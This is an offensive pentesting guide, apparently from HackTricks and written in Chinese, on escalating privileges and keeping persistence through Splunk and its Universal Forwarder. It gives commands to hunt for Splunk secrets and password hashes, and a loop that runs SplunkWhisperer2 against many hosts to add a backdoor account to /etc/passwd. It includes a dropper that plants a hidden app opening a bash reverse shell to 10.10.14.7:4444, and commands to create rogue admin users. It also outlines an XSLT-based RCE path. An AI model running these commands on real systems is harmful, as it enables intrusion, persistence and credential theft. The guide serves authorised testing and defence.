# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

如果你在**内部**或**外部**枚举一台机器时发现 **Splunk running**（通常 **8000** 是 web UI，**8089** 是 management API），有效凭据通常可以通过 app installation、scripted inputs 或 management actions 转化为 **code execution**。如果 Splunk 以 **root** 运行，这通常会立即导致 **privilege escalation**。

如果你只需要通用的远程攻击面、枚举，或 app-upload RCE 路径，请查看：

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

如果你**已经是 root**，并且 Splunk service 不是只监听 localhost，那么你还可以窃取 **Splunk password hashes**、恢复 **encrypted secrets**，或者推送一个 **malicious app** 来在本地或多个 forwarders 上保持 persistence。

## Interesting Local Files

当你落地到一台运行 Splunk 或 Splunk Universal Forwarder 的主机时，以下通常是最有意思的路径：
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Important artifacts:

- **`$SPLUNK_HOME/etc/passwd`**: 本地 Splunk 用户和密码哈希。
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: Splunk 用于加密存储在多个 `.conf` 文件中的 secrets 的 key。
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: 初始 admin bootstrap 文件；在 gold images 和 provisioning mistakes 中很有用。如果 `etc/passwd` 已经存在，它会被忽略。
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: 常见用于启用 scripted inputs 的位置。
- **`$SPLUNK_HOME/etc/deployment-apps/`** 或 **`$SPLUNK_HOME/etc/apps/`**: 很适合隐藏持久化 app，或查看已经正在分发的内容。

## Splunk Universal Forwarder Agent Exploit Summary

更多细节请查看 [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)。这里只是一个摘要：

**Exploit overview:**
一个针对 Splunk Universal Forwarder (UF) 的 exploit 允许拥有 **agent password** 的攻击者在运行该 agent 的系统上执行任意代码，从而可能危及环境中的很大一部分。

**Why it works:**

- UF 管理服务通常暴露在 **TCP 8089** 上。
- 攻击者可以认证到 API，并指示 forwarder 安装一个 **malicious app bundle**。
- 同样的 primitive 既可用于本地的 **LPE**，也可用于远程的 **RCE**。
- 像 **SplunkWhisperer2** 这样的公开工具会自动创建 app bundle，并且可以针对 Linux 目标调整 payloads。

**Common ways to recover the password:**

- 文档、脚本、共享目录或部署自动化中的明文 credentials。
- `$SPLUNK_HOME/etc/passwd` 中的密码哈希，然后进行离线破解。
- golden images 或 provisioning leftovers，例如 `user-seed.conf`。

**Impact:**

- 每台被攻陷主机上的 SYSTEM/root 级别代码执行。
- 部署持久化 app、backdoors 或 ransomware。
- 在数据转发前禁用或篡改 telemetry。

**Example command for exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**可用的 public exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## 通过 Scripted Inputs 或恶意 Apps 持久化

如果你以 `root`/`splunk` 身份拥有 **filesystem write access**，或者有认证权限来安装 apps，一个非常可靠的持久化机制就是投放一个带有 **scripted input** 的 **custom app**。Splunk 自己的文档预期 scripted inputs 存放在 app 目录下，并通过 `inputs.conf` 启用。

典型布局：
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimal `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Quick Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notes:

- 同样的技巧也适用于 **Universal Forwarder**，使用 `/opt/splunkforwarder/etc/apps/`。
- 攻击者通常会通过修改合法的 add-on 来伪装，而不是创建一个明显恶意的 app。
- 在 **deployment server** 上，把恶意 app 放进 `deployment-apps/` 会变成 **fleet-wide persistence**，因为 forwarders 会轮询、下载更新后的 apps，并且通常会重启以应用它们。

## Credential Theft and Admin Takeover

如果你能读取 Splunk 的本地文件，通常有两个好目标：恢复 **Splunk admin access**，以及恢复 **encrypted service credentials**。

### Password hashes and local users

Splunk 将本地认证数据存储在 `etc/passwd` 中。根据部署情况，破解该文件可能会恢复可用于 web UI 和 management API 的有效凭据。

如果你已经拥有有效的 **admin** 凭据，并且 Splunk 使用其 **native** authentication backend，那么 CLI 本身就可以用于 persistence：
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` 和加密值

Splunk 使用 `etc/auth/splunk.secret` 来保护存储在多个配置文件中的敏感值。如果你能同时窃取 **secret** 和相关的 **`.conf`** 文件，通常就可以恢复或重放：

- forwarder/indexer 共享 secret，例如 `pass4SymmKey`
- TLS private-key 密码，例如 `sslPassword`
- LDAP bind 凭据，例如 `bindDNPassword`

即使 Splunk admin 密码本身无法破解，这对 **lateral movement** 也很有用。

### `user-seed.conf` abuse

`user-seed.conf` 只会在首次启动时，或者 `etc/passwd` 不存在时被使用。这让它在已运行的主机上用途较小，但在以下场景中很有意思：

- 被入侵的安装模板
- container images
- 无人值守的 provisioning workflow
- Splunk 会自动重新初始化的 appliance

在这些情况下，植入一个用 `splunk hash-passwd` 生成的 `HASHED_PASSWORD`，可以让你在重新部署后以安静的方式重新获得 admin 访问权限。

## Abusing Splunk Queries

更多细节请查看 [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)。

一个近期很有用的技术是，在受影响的 Splunk Enterprise 版本中 abuse **user-supplied XSLT**，把低权限已认证账户变成以 `splunk` 用户身份执行 **OS command execution**。

高层流程：

1. 登录 Splunk。
2. 通过 preview/upload 功能上传一个恶意 **XSL** 文件。
3. 让 Splunk 使用 **dispatch** 目录中上传的 stylesheet 渲染搜索结果。
4. 利用 XSLT payload 写入文件，或通过 Splunk 的 search pipeline 触发执行（例如通过接触到内部功能，如 `runshellscript`）。

这里重要的进攻性结论是，这条路径是 **post-auth RCE without needing app upload**。在 Linux 上，它通常会让你落到 **`splunk`** 账户，而这仍然很有价值，因为这个用户往往拥有 application tree，可以读取 secrets，并且可以植入即使 shell 丢失后仍会保留的 persistent apps。

利用过程中使用的一个代表性路径是：
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
如果 Splunk 以过多的 privileges 运行，或者 `splunk` 用户可以访问危险的 scripts、可写的 service units，或存在不当的 `sudo` rules，这就会形成一条干净的 **LPE** chain。

## References

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
